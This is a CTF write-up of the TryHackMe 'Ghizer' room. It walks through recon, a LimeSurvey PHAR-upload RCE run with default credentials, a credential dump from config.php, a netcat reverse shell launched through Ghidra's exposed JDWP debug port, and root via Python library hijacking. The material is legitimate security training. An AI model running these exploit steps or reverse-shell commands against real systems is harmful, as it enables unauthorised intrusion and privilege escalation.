+++
author = "Angel Barre"
title = "Tryhackme GhizerCTF"
description = "Lucrecia has installed multiple web applications on the server."
date = "2020-12-23T10:41:24-05:00"
tags = ["ctf", "web"]
categories = ["Tryhackme"]
series = ["Web Aplication"]
aliases = ["Explotation web"]
+++
![cover](https://imgur.com/TjL3rr0.png)

## # Recon

We start with a basic nmap scan to find out what ports and services we are dealing with.

```nmap
❯ nmap -oN initial 10.10.221.248

Starting Nmap 7.01 ( https://nmap.org ) at 2020-12-23 10:36 -05
Nmap scan report for 10.10.221.248
Host is up (0.19s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 14.38 seconds
```
Quickly reviewing we look at port **80** that we are dealing with with something similar to a web application called **LimeSurvey**.
![web](https://imgur.com/BIPleu3.png)

Well, since we don't see anything interesting in port **80** we will do a more detailed scan with **nmap**.

```nmap
PORT    STATE SERVICE  REASON  VERSION 
21/tcp  open  ftp?     syn-ack
80/tcp  open  http     syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: B55AD3F0C0A029568074402CE92ACA23
|_http-generator: LimeSurvey http://www.limesurvey.org
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title:         LimeSurvey    
443/tcp open  ssl/http syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
| ssl-cert: Subject: commonName=ubuntu
| Issuer: commonName=ubuntu
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-07-23T17:27:31
| Not valid after:  2030-07-21T17:27:31
| MD5:   afb1 a2b9 1183 2e49 f707 9d1a 7198 9ca3
| SHA-1: 37f1 945f 6bc4 3fad 3f0f ca8d 3788 2c17 cc25 0792
| -----BEGIN CERTIFICATE-----
| MIICsjCCAZqgAwIBAgIJAIIhLFTsAdpUMA0GCSqGSIb3DQEBCwUAMBExDzANBgNV
| BAMMBnVidW50dTAeFw0yMDA3MjMxNzI3MzFaFw0zMDA3MjExNzI3MzFaMBExDzAN
| BgNVBAMMBnVidW50dTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALm4
| +BEIDO1MIeQZQkUZfeEqegkSYi8IGF2zvpL2zpUOCjcpm9pFZwj/ZT8g/nbdhVpX
| Q0z3eWzFKRRZdthTOfCtNkZjQhJlpR+Fvc7QDUHSG+ugZL0nIuQMKaniom6OVuQg
| 3nyxPehC9eYOjovV6m3TOWVHRYMRpf54RHHwwvpHwHkJAEcg7oHwBgP/JeW3h20r
| G/Ri8FpPZs49xYArZ15te9ofw0TUigqx03RguwKLYr+/i7+UFwmzU93+ylz/PE16
| HVfEBAFGIY52wWkc5Pt3+B+T5HZqVLqAW8LNcxSuugiMkgV1r4QQlBgNpc026aZR
| EG6sF9C57EOQgyBVihECAwEAAaMNMAswCQYDVR0TBAIwADANBgkqhkiG9w0BAQsF
| AAOCAQEAXYtbViAQzTFPjlPzwItXfMsyYYkH9guFsI9l0A6/6xa6CCwklJAF1vjz
| tpHg338NRn4CXobk9Y6aopmUsNhFwlryS5YwPQ1s5ml6GHaDQ7ijG52J4Uj1J4o5
| nRlDgqXi8EM/Dl5cgwHBnQ3k/u3uoPp/H0jIfXK/jskVurNb/sT6Raj5TEgcgMMm
| 8Hzj0jqSROhDZFtU93z8OCZWBaO8u+wVj0xtdHpg+X8UQalIrASlsSNn1i50lU2p
| 0C+eASFiDrOue7gzDDO4pdYrxmG5MiRNrfKQPLv3IvT0gEgCgkulRLo//CeY1tQ9
| 7KFSteW6LSwpqHdP08faw+/nJnfnXQ==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap
.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.01%I=7%D=12/23%Time=5FE3738F%P=i686-pc-linux-gnu%r(NULL,
SF:33,"220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203
SF:\.0\.3\)\n")%r(GenericLines,58,"220\x20Welcome\x20to\x20Anonymous\x20FT
SF:P\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\x20login\x20with\x2
SF:0USER\x20and\x20PASS\.\n")%r(Help,58,"220\x20Welcome\x20to\x20Anonymous
SF:\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\x20login\x20w
SF:ith\x20USER\x20and\x20PASS\.\n")%r(GetRequest,58,"220\x20Welcome\x20to\
SF:x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\x
SF:20login\x20with\x20USER\x20and\x20PASS\.\n")%r(HTTPOptions,58,"220\x20W
SF:elcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n53
SF:0\x20Please\x20login\x20with\x20USER\x20and\x20PASS\.\n")%r(RTSPRequest
SF:,58,"220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x20
SF:3\.0\.3\)\n530\x20Please\x20login\x20with\x20USER\x20and\x20PASS\.\n")%
SF:r(RPCCheck,33,"220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(
SF:vsFTPd\x203\.0\.3\)\n")%r(DNSVersionBindReq,58,"220\x20Welcome\x20to\x2
SF:0Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\x20
SF:login\x20with\x20USER\x20and\x20PASS\.\n")%r(DNSStatusRequest,58,"220\x
SF:20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\
SF:n530\x20Please\x20login\x20with\x20USER\x20and\x20PASS\.\n")%r(SSLSessi
SF:onReq,33,"220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTP
SF:d\x203\.0\.3\)\n")%r(TLSSessionReq,33,"220\x20Welcome\x20to\x20Anonymou
SF:s\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n")%r(Kerberos,33,"220\x20W
SF:ith\x20USER\x20and\x20PASS\.\n")%r(GetRequest,58,"220\x20Welcome\x20to\                                                     
SF:x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\x
SF:20login\x20with\x20USER\x20and\x20PASS\.\n")%r(HTTPOptions,58,"220\x20W
SF:elcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n53
SF:0\x20Please\x20login\x20with\x20USER\x20and\x20PASS\.\n")%r(RTSPRequest
SF:,58,"220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x20
SF:3\.0\.3\)\n530\x20Please\x20login\x20with\x20USER\x20and\x20PASS\.\n")%
SF:r(RPCCheck,33,"220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(
SF:vsFTPd\x203\.0\.3\)\n")%r(DNSVersionBindReq,58,"220\x20Welcome\x20to\x2
SF:0Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\x20
SF:login\x20with\x20USER\x20and\x20PASS\.\n")%r(DNSStatusRequest,58,"220\x
SF:20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\
SF:n530\x20Please\x20login\x20with\x20USER\x20and\x20PASS\.\n")%r(SSLSessi
SF:onReq,33,"220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTP
SF:d\x203\.0\.3\)\n")%r(TLSSessionReq,33,"220\x20Welcome\x20to\x20Anonymou
SF:s\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n")%r(Kerberos,33,"220\x20W
SF:elcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n")
SF:%r(SMBProgNeg,33,"220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x2
SF:0\(vsFTPd\x203\.0\.3\)\n")%r(X11Probe,58,"220\x20Welcome\x20to\x20Anony
SF:mous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\x20Please\x20login\
SF:x20with\x20USER\x20and\x20PASS\.\n")%r(FourOhFourRequest,58,"220\x20Wel
SF:come\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0\.3\)\n530\
SF:x20Please\x20login\x20with\x20USER\x20and\x20PASS\.\n")%r(LPDString,58,
SF:"220\x20Welcome\x20to\x20Anonymous\x20FTP\x20server\x20\(vsFTPd\x203\.0
SF:\.3\)\n530\x20Please\x20login\x20with\x20USER\x20and\x20PASS\.\n");

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 11:45
Completed NSE at 11:45, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 11:45
Completed NSE at 11:45, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 178.79 seconds

```
## # FTP
We enter through the FTP service with the credentials of anonymous **anonymous: anonymous** in which we find several files among them the flag **root.txt** and **user.txt**, when trying to obtain one of these files it shows a permission denied message so it does not we managed to do nothing in this service.

```ftp
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-------    1 0        0            4096  Dec 12  2019 client.py
-rwx------    1 0        0            45550 Nov 28  2019 test.c
-rw-------    1 0        0            5513  Nov 28  2019 prototype.c
-rw-------    1 0        0            5513  Dec 12  2019 root.txt
-rwx------    1 0        0            1024  Nov 28  2019 user.txt
-rw-------    1 0        0            54324 Nov 28  2019 i_honeypot.py
226 Directory send OK.
ftp> get user.txt
local: user.txt remote: user.txt
Permission denied.
200 PORT command successful. Consider using PASV.
550 Permission denied.
ftp> get root.txt
local: root.txt remote: root.txt
Permission denied.
200 PORT command successful. Consider using PASV.
550 Permission denied.
ftp> pwd
257 "/home/lucrecia/ftp/" is the current directory
ftp> bye
221 Goodbye.
```
## # HTTP
As we did not get anything in the previous service we continue more thoroughly with **HTTP**.
![web](https://imgur.com/BIPleu3.png)
By finding out better about the service, we know that it is a survey service.

## # GOBUSTER
To avoid wasting time we started fuzzing directories.

```bash
❯  gobuster dir -u http://ghizer.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -t 50 -x php,html,txt -o gobuster.log
/docs                 (Status: 301) [Size: 307] [--> http://ghizer.thm/docs/]
/index.php            (Status: 200) [Size: 40931]                            
/themes               (Status: 301) [Size: 309] [--> http://ghizer.thm/themes/]
/assets               (Status: 301) [Size: 309] [--> http://ghizer.thm/assets/]
/admin                (Status: 301) [Size: 308] [--> http://ghizer.thm/admin/] 
/upload               (Status: 301) [Size: 309] [--> http://ghizer.thm/upload/]
/tests                (Status: 301) [Size: 308] [--> http://ghizer.thm/tests/] 
/plugins              (Status: 301) [Size: 310] [--> http://ghizer.thm/plugins/]
/application          (Status: 301) [Size: 314] [--> http://ghizer.thm/application/]
/tmp                  (Status: 301) [Size: 306] [--> http://ghizer.thm/tmp/]        
/framework            (Status: 301) [Size: 312] [--> http://ghizer.thm/framework/]  
/locale               (Status: 301) [Size: 309] [--> http://ghizer.thm/locale/]     
/installer            (Status: 301) [Size: 312] [--> http://ghizer.thm/installer/]  
/third_party          (Status: 301) [Size: 314] [--> http://ghizer.thm/third_party/]
```
When entering the directory **/admin** we find a login of that service when we do a search in **Google** about that service we find that it has default credentials, then we use them to initiate session.

## # LimeSurvey - RCE

Upon entering the Administration Panel we see a list of services that we can perform together with the version of the web application service.
![version](https://imgur.com/xCAhPTt.png)

Doing a google search for **Lime Survey version 3.15.9 exploit** we found a python exploit, let's use the exploit with the default credentials.

[Exploit LImeSurvey RCE](https://www.exploit-db.com/exploits/46634)

```shell
❯ python2 exploit.py http://ghizer.thm admin password
[*] Logging in to LimeSurvey...
[*] Creating a new Survey...
[+] SurveyID: 353418
[*] Uploading a malicious PHAR...
[*] Sending the Payload...
[*] TCPDF Response: <strong>TCPDF ERROR: </strong>[Image] Unable to get the size of the image: phar://./upload/surveys/353418/files/malicious.jpg
[+] Pwned! :)
[+] Getting the shell...
$ ls
CONTRIBUTING.md
README.md
admin
application
assets
composer.json
docs
framework
index.php
installer
locale
manifest.yml
phpci.yml
phpunit.xml
plugins
shell.php
tests
themes
third_party
tmp
upload

$ cat application/config/config.php

return array(
        'components' => array(
                'db' => array(
                        'connectionString' => 'mysql:host=localhost;port=3306;dbname=limedb;',
                        'emulatePrepare' => true,
                        'username' => 'Anny',
                        'password' => '[REDACTED]',
                        'charset' => 'utf8mb4',
                        'tablePrefix' => 'lime_',
                ),

                // Uncomment the following lines if you need table-based sessions.
                // Note: Table-based sessions are currently not supported on MSSQL server.
                // 'session' => array (
                        // 'class' => 'application.core.web.DbHttpSession',
                        // 'connectionID' => 'db',
                        // 'sessionTableName' => '{{sessions}}',
                // ),

                'urlManager' => array(
                        'urlFormat' => 'path',
                        'rules' => array(
                                // You can add your own rules here
                        ),
                        'showScriptName' => true,
                ),

```
With the credentials obtained, log in to port **443** of **Wordpress** adding the ssl certificate
in the wordpress installer that is in an easy path to find.
![wordpress](https://i.imgur.com/lxaffW3.png)
Since we cannot do anything in wordpress, we get rce again and this time we configure a shell in php and we build a python web server to transfer the shell to the victim machine.

```shell
❯ nc -nlvp 9001
Listening on [0.0.0.0] (family 0, port 9001)
Connection from [10.10.221.248] port 9001 [tcp/*] accepted (family 2, sport 54328)
Linux ubuntu 4.15.0-112-generic #113~16.04.1-Ubuntu SMP Fri Jul 10 04:37:08 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 12:12:39 up  4:37,  1 user,  load average: 0.15, 0.06, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
veronica tty7     :0               07:35    4:37m  1:38   0.13s /sbin/upstart --user
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

```python
python -c 'import pty;pty.spawn("/bin/bash")'
```
## # GHIDRA RCE
With the command **netsat -ano** we can see which web services are running at first glance we see **127.0.0.1:18001**.
We download and use linpeas on the victim machine and repeatedly see that Ghidra-9.0 is running
We need remote command to execute in GhidraDebug
We explored the vulnerabilities in ghidra and at first we saw the exploit [Ghidra (Linux) 9.0.4 - .gar Arbitrary Code Execution](https://www.exploit-db.com/exploits/47231) that needs a **project.gar** file which can be created in Ghidra from a project, but this exploit needs a interaction with the visual interface of Ghidra. We also found the Remote Code Execution Through JDWP Debug Port vulnerability which affects version 9.0.4. In this vulnerability, Ghidra opens JDWP in debug mode, which allows it to connect to port **18001** of localhost,We have access to the port (18001) locally with the current shell so we carry out the exploitation.

## # Commands RCE Ghidra
```shell
// Connection to jdwp

jdb -attach localhost:18001

// List available classes
// classpath

stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()

// Execution of the reverse shell

print new java.lang.Runtime().exec("nc iptun0 1337 -e /bin/sh")
```

```shell
❯ nc -nlvp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [10.10.221.248] port 4444 [tcp/*] accepted (family 2, sport 49890)
id
uid=1000(veronica) gid=1000(veronica) groups=1000(veronica),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
python -c 'import pty;pty.spawn("/bin/bash")'
veronica@ubuntu:~$ cat user.txt
```
We managed to get our flag **user.txt** and a shell with the user **Veronica**.

## # PRIVILEGE ESCALATION
We do a small enumeration in **Veronica's** main folder and we see a python script which encodes the **tryhackme is the best** message and also the variable could give us a clue of what we should do.

```python
import base64

hijackme = base64.b64encode(b'tryhackme is the best')
print(hijackme)
```

We also see a cron that the root user executes.
```shell
veronica@ubuntu:~$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    cd /root/Lucrecia && bash lucre.sh
#
```
Also when performing **sudo -l -l** we see that we can execute **/usr/bin/python3.5 /home/veronica/base.py** with sudo.
```shell
veronica@ubuntu:~$ sudo -l -l
sudo -l -l
Matching Defaults entries for veronica on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User veronica may run the following commands on ubuntu:

Sudoers entry:
    RunAsUsers: ALL
    RunAsGroups: ALL
    Commands:
        ALL

Sudoers entry:
    RunAsUsers: root
    RunAsGroups: root
    Options: !authenticate
    Commands:
        /usr/bin/python3.5 /home/veronica/base.py
```
We create the base64.py file where we place a reverse shell to perform [Python Library Hijacking](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/).
```shell
veronica@ubuntu:~$ echo 'import os;os.system("/bin/bash")' > base64.py
echo 'import os;os.system("/bin/bash")' > base64.py
veronica@ubuntu:~$ sudo -u root /usr/bin/python3.5 /home/veronica/base.py
sudo -u root /usr/bin/python3.5 /home/veronica/base.py
root@ubuntu:~# ls
ls
base64.py  Documents         ghidra_9.0  Public       user.txt
base.py    Downloads         Music       __pycache__  Videos
Desktop    examples.desktop  Pictures    Templates
root@ubuntu:~# cat /root/root.txt
```
And we obtain the root flag, until here I am waiting for your feedback.
